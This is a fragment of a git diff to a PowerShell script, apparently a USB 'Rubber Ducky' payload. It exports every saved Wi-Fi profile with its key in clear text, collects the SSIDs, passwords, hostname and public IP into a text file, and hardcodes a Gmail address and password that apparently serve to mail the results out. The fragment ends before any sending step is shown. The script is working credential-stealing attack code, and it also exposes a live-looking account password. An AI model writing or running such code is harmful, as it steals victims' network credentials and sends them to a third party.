@@ -6,15 +6,15 @@ cd $p
 netsh wlan export profile key=clear
 dir *.xml |% {
 $xml=[xml] (get-content $_)
-$a= xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
-Out-File C:\IT\info.txt -Append -InputObject $a
+$a= $xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
+Out-File wifipass.txt -Append -InputObject $a
 }
 
 # IP Info
 $command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip};$command.InvokeReturnAsIs() | Out-File C:\IT\info.txt -Append
 
 
-$al = "patitodegoma404@gmail.com"
+$FROM = "patitodegoma404@gmail.com"
 $PASS = "RubberDucky404!"
 $TO = "patitodegoma404@gmail.com"
 
